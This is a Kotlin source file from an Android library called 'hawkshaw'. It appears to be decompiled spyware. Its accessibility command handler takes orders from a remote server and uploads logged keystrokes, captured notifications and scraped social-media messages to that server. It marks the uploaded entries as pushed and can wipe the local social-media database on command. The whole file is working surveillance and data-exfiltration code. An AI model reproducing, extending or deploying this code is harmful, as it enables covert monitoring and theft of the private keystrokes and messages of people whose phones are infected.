package com.hawkshaw.library.features.accessibility

import android.content.Intent
import android.util.Log
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.Injector
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.datalayer.models.PackageName
import com.hawkshaw.library.datalayer.network.twirp.ApiResponse
import com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.withContext
import kotlin.coroutines.Continuation
import kotlin.coroutines.intrinsics.COROUTINE_SUSPENDED

/**
 * Handler for accessibility-related operations and data pushing
 */
object HandlerKt {
    private const val TAG = "AccessibilityHandler"
    private const val TAG_DEBUG = "AccessibilityHandler_DEBUG" // For new debug logs

    /**
     * Handle accessibility commands
     */
    suspend fun handleAccessibilityCommand(command: Command, eVar: CoroutineScope): Any {
        Log.d(TAG_DEBUG, "handleAccessibilityCommand called with command type: ${command.type}")
        val result: Any = when (command.type) {
            Command.CommandType.RunAccessibilityCommand -> {
                Log.d(TAG_DEBUG, "Handling RunAccessibilityCommand")
                command.accessibilityCommandRequest?.let { runAccessibilityCommand(it) }
                Unit
            }
            Command.CommandType.PushAccessibilityKeylogger -> {
                Log.d(TAG_DEBUG, "Handling PushAccessibilityKeylogger")
                pushKeyLogger(eVar)
            }
            Command.CommandType.PushAccessibilityNotifications -> {
                Log.d(TAG_DEBUG, "Handling PushAccessibilityNotifications")
                pushNotifications(eVar)
            }
            Command.CommandType.PushAccessibilitySocialMedia -> {
                Log.d(TAG_DEBUG, "Handling PushAccessibilitySocialMedia")
                pushSocialMedia(eVar)
            }
            Command.CommandType.AccessibilityNukeSocialMediaDatabase -> {
                Log.d(TAG_DEBUG, "Handling AccessibilityNukeSocialMediaDatabase")
                nukeSocialMediaDatabase(eVar)
            }
            else -> {
                Log.d(TAG_DEBUG, "Unknown command type: ${command.type}")
                Unit
            }
        }
        return result
    }

    /**
     * Run an accessibility command by starting the MainAccessibilityService
     */
    private fun runAccessibilityCommand(request: Command.AccessibilityCommandRequest?) {
        Log.d(TAG_DEBUG, "runAccessibilityCommand called with request: $request")
        if (request == null) {
            Logger.e(TAG, "RunAccessibilityCommand: Request is null", null, false, 12, null)
            Log.e(TAG_DEBUG, "RunAccessibilityCommand: Request is null")
            return
        }
        val intent = Intent(App.getContext(), MainAccessibilityService::class.java)
        val json = ContentNegotiationInterceptorKt.json
        intent.putExtra("command", json.encodeToString(Command.AccessibilityCommandRequest.serializer(), request))
        App.getContext().startService(intent)
        Logger.d(TAG, "Started MainAccessibilityService with command", false, 4, null)
        Log.d(TAG_DEBUG, "Started MainAccessibilityService with request: $request")
    }

    /**
     * Nuke the social media database
     */
    private suspend fun nukeSocialMediaDatabase(scope: CoroutineScope): Any {
        Log.d(TAG_DEBUG, "nukeSocialMediaDatabase called")
        return withContext(scope.coroutineContext) {
            try {
                val nukeResult = AppDatabaseKt.db.socialMediaDao().nukeTable()
                Log.d(TAG_DEBUG, "Social media database nuke operation attempted. Result: $nukeResult")
                if (nukeResult === COROUTINE_SUSPENDED) COROUTINE_SUSPENDED else Unit
            } catch (e: Exception) {
                Logger.e(TAG, "Error nuking social media database: ${e.message}", e, false, 12, null)
                Log.e(TAG_DEBUG, "Error nuking social media database: ${e.message}", e)
                Unit
            }
        }
    }

    /**
     * Push keylogger data to the server
     */
    private suspend fun pushKeyLogger(scope: CoroutineScope): Any {
        Log.d(TAG_DEBUG, "pushKeyLogger called")
        return withContext(scope.coroutineContext) {
            try {
                val keyloggerDao = AppDatabaseKt.db.keyloggerDao()
                val entries = mutableListOf<com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity>()
                keyloggerDao.getUnpushedLogs().collect { entries.addAll(it) }

                Logger.d(TAG, "Pushing ${entries.size} keylogger entries", false, 4, null)
                Log.i(TAG_DEBUG, "Found ${entries.size} keylogger entries to push.")

                if (entries.isNotEmpty()) {
                    val request = com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest(
                        entries.map { entry ->
                            com.hawkshaw.library.datalayer.models.accessibility.PushKeyLogsRequest.KeyLog(
                                type = entry.type,
                                message = entry.message,
                                packageName = entry.packageName,
                                timestamp = entry.timestamp
                            )
                        }
                    )
                    Log.d(TAG_DEBUG, "Pushing keylogger request: $request")
                    val response = Injector.INSTANCE.accessibilityService.pushKeyLogs(request)
                    Log.d(TAG_DEBUG, "PushKeyLogs response: $response")

                    when (response) {
                        is ApiResponse.Success -> {
                            entries.forEach { entry -> keyloggerDao.markAsPushed(entry.id) }
                            Logger.d(TAG, "Successfully pushed keylogger entries", false, 4, null)
                            Log.i(TAG_DEBUG, "Successfully pushed keylogger entries and marked as pushed.")
                        }
                        is ApiResponse.Error -> {
                            Logger.e(TAG, "Failed to push keylogger entries: ${response.errorMessage}", null, false, 12, null)
                            Log.e(TAG_DEBUG, "Failed to push keylogger entries: ${response.errorMessage}")
                        }
                        is ApiResponse.InProgress -> {
                            Logger.d(TAG, "Keylogger push in progress", false, 4, null)
                            Log.d(TAG_DEBUG, "Keylogger push in progress.")
                        }
                    }
                } else {
                    Log.i(TAG_DEBUG, "No keylogger entries to push.")
                }
                Unit
            } catch (e: Exception) {
                Logger.e(TAG, "Error pushing keylogger data: ${e.message}", e, false, 12, null)
                Log.e(TAG_DEBUG, "Error pushing keylogger data: ${e.message}", e)
                Unit
            }
        }
    }

    /**
     * Push notifications to the server
     */
    private suspend fun pushNotifications(scope: CoroutineScope): Any {
        Log.d(TAG_DEBUG, "pushNotifications called")
        return withContext(scope.coroutineContext) {
            try {
                val notificationDao = AppDatabaseKt.db.notificationDao()
                val notifications = mutableListOf<com.hawkshaw.library.datalayer.room.notification.NotificationEntity>()
                notificationDao.getUnpushedNotifications().collect { notifications.addAll(it) }

                Logger.d(TAG, "Pushing ${notifications.size} notifications", false, 4, null)
                Log.i(TAG_DEBUG, "Found ${notifications.size} notifications to push.")

                if (notifications.isNotEmpty()) {
                    val request = com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest(
                        notifications.map { notification ->
                            com.hawkshaw.library.datalayer.models.accessibility.PushNotificationRequest.Notification(
                                id = notification.id,
                                packageName = notification.packageName,
                                title = notification.title,
                                text = notification.text,
                                timestamp = notification.timestamp,
                                pushed = notification.pushed
                            )
                        }
                    )
                    Log.d(TAG_DEBUG, "Pushing notification request: $request")
                    val response = Injector.INSTANCE.accessibilityService.pushNotifications(request)
                    Log.d(TAG_DEBUG, "PushNotifications response: $response")
                    
                    when (response) {
                        is ApiResponse.Success -> {
                            notifications.forEach { notification -> notificationDao.markAsPushed(notification.id) }
                            Logger.d(TAG, "Successfully pushed notifications", false, 4, null)
                            Log.i(TAG_DEBUG, "Successfully pushed notifications and marked as pushed.")
                        }
                        is ApiResponse.Error -> {
                            Logger.e(TAG, "Failed to push notifications: ${response.errorMessage}", null, false, 12, null)
                            Log.e(TAG_DEBUG, "Failed to push notifications: ${response.errorMessage}")
                        }
                        is ApiResponse.InProgress -> {
                            Logger.d(TAG, "Notifications push in progress", false, 4, null)
                            Log.d(TAG_DEBUG, "Notifications push in progress.")
                        }
                    }
                } else {
                    Log.i(TAG_DEBUG, "No notifications to push.")
                }
                Unit
            } catch (e: Exception) {
                Logger.e(TAG, "Error pushing notifications: ${e.message}", e, false, 12, null)
                Log.e(TAG_DEBUG, "Error pushing notifications: ${e.message}", e)
                Unit
            }
        }
    }

    /**
     * Push social media data to the server
     */
    private suspend fun pushSocialMedia(scope: CoroutineScope): Any {
        Log.d(TAG_DEBUG, "pushSocialMedia called")
        return withContext(scope.coroutineContext) {
            try {
                val socialMediaDao = AppDatabaseKt.db.socialMediaDao()
                val entries = mutableListOf<SocialMediaEntity>()
                socialMediaDao.getUnpushedMessages().collect { entries.addAll(it) }

                Logger.d(TAG, "Pushing ${entries.size} social media entries", false, 4, null)
                Log.i(TAG_DEBUG, "Found ${entries.size} social media entries to push.")

                if (entries.isNotEmpty()) {
                    val request = com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest(
                        page = 1,
                        messages = entries.map { entry ->
                            com.hawkshaw.library.datalayer.models.accessibility.PushSocialMediaRequest.SocialMediaMessage(
                                ccn = "${entry.packageName}-${entry.message ?: ""}-${entry.timestamp}",
                                sender = entry.sender,
                                message = entry.message ?: "", 
                                type = entry.type, 
                                application = PackageName.valueOf(entry.packageName), // Ensure entry.packageName is a valid PackageName enum
                                ccs = null,
                                time = ""
                            )
                        }
                    )
                    Log.d(TAG_DEBUG, "Pushing social media request: $request")
                    val response = Injector.INSTANCE.accessibilityService.pushSocialMedia(request)
                    Log.d(TAG_DEBUG, "PushSocialMedia response: $response")

                    when (response) {
                        is ApiResponse.Success -> {
                            entries.forEach { entry -> socialMediaDao.markAsPushed(entry.id) }
                            Logger.d(TAG, "Successfully pushed social media entries", false, 4, null)
                            Log.i(TAG_DEBUG, "Successfully pushed social media entries and marked as pushed.")
                        }
                        is ApiResponse.Error -> {
                            Logger.e(TAG, "Failed to push social media entries: ${response.errorMessage}", null, false, 12, null)
                            Log.e(TAG_DEBUG, "Failed to push social media entries: ${response.errorMessage}")
                        }
                        is ApiResponse.InProgress -> {
                            Logger.d(TAG, "Social media push in progress", false, 4, null)
                            Log.d(TAG_DEBUG, "Social media push in progress.")
                        }
                    }
                } else {
                    Log.i(TAG_DEBUG, "No social media entries to push.")
                }
                Unit
            } catch (e: Exception) {
                Logger.e(TAG, "Error pushing social media data: ${e.message}", e, false, 12, null)
                Log.e(TAG_DEBUG, "Error pushing social media data: ${e.message}", e)
                // It's important to also log the specific exception if PackageName.valueOf fails
                if (e is IllegalArgumentException && e.message?.contains("No enum constant com.hawkshaw.library.datalayer.models.PackageName") == true) {
                    Log.e(TAG_DEBUG, "Invalid packageName found for SocialMediaEntity. Could not convert to PackageName enum: ${e.message}", e)
                }
                Unit
            }
        }
    }
}
